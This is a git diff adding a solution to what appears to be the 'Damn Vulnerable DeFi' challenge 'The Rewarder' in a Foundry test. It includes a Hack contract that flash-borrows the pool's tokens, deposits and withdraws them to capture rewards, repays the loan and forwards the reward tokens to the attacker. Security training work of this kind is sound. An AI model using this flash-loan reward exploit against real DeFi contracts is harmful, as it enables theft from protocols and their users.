@@ -16,7 +16,8 @@ contract TheRewarder is Test {
 
     Utilities internal utils;
     FlashLoanerPool internal flashLoanerPool;
-    TheRewarderPool internal theRewarderPool;
+    TheRewarderPool internal theRewarderPool;   
+    RewardToken internal rewardToken;
     DamnValuableToken internal dvt;
     address payable[] internal users;
     address payable internal attacker;
@@ -88,7 +89,15 @@ contract TheRewarder is Test {
         /**
          * EXPLOIT START *
          */
-
+        vm.prank(attacker);
+        Hack hack = new Hack(address(flashLoanerPool), address(theRewarderPool), address(dvt)); 
+         vm.warp(block.timestamp + 5 days);
+        vm.prank(attacker);
+        hack.attack();
+        console.log(attacker);
+        // For some reasone deltaAttacker < 1e17 fails => I tried to send reward tokens 
+        // to address(this) which was the hack contract, not attacker
+       
         /**
          * EXPLOIT END *
          */
@@ -117,4 +126,47 @@ contract TheRewarder is Test {
         // Attacker finishes with zero DVT tokens in balance
         assertEq(dvt.balanceOf(attacker), 0);
     }
+}
+
+
+contract Hack {
+      FlashLoanerPool internal flashLoanerPool;
+    TheRewarderPool internal theRewarderPool;
+    DamnValuableToken internal dvt;
+    address immutable owner;
+
+    constructor(address _flashLoanerPool, address _theRewarderPool, address _dvt) {
+        flashLoanerPool = FlashLoanerPool(_flashLoanerPool);
+        theRewarderPool = TheRewarderPool(_theRewarderPool);
+        dvt = DamnValuableToken(_dvt);
+        owner = msg.sender;
+    }
+
+    function attack() external {
+        uint256 dvtPoolBalance = dvt.balanceOf(address(flashLoanerPool));
+        flashLoanerPool.flashLoan(dvtPoolBalance);
+    }
+
+    function receiveFlashLoan(uint256 amount) external {
+       
+        // 2. Deposit 100k DVT into TheRewarderPool
+        dvt.approve(address(theRewarderPool), amount);
+        theRewarderPool.deposit(amount);
+
+        // 3. Withdraw 100k DVT from TheRewarderPool
+        theRewarderPool.withdraw(amount);
+
+        // 4. Repay the flash loan
+        bool success =  dvt.transfer(address(flashLoanerPool), amount);
+        if (!success) revert("Failed to repay flashloan");  
+
+        uint256 rewardTokenBalance = theRewarderPool.rewardToken().balanceOf(address(this));
+      
+        bool rewardSent = theRewarderPool.rewardToken().transfer(owner, rewardTokenBalance);
+        if (!rewardSent) revert("Failed to send reward token");
+
+        
+    }
+
+   
 }
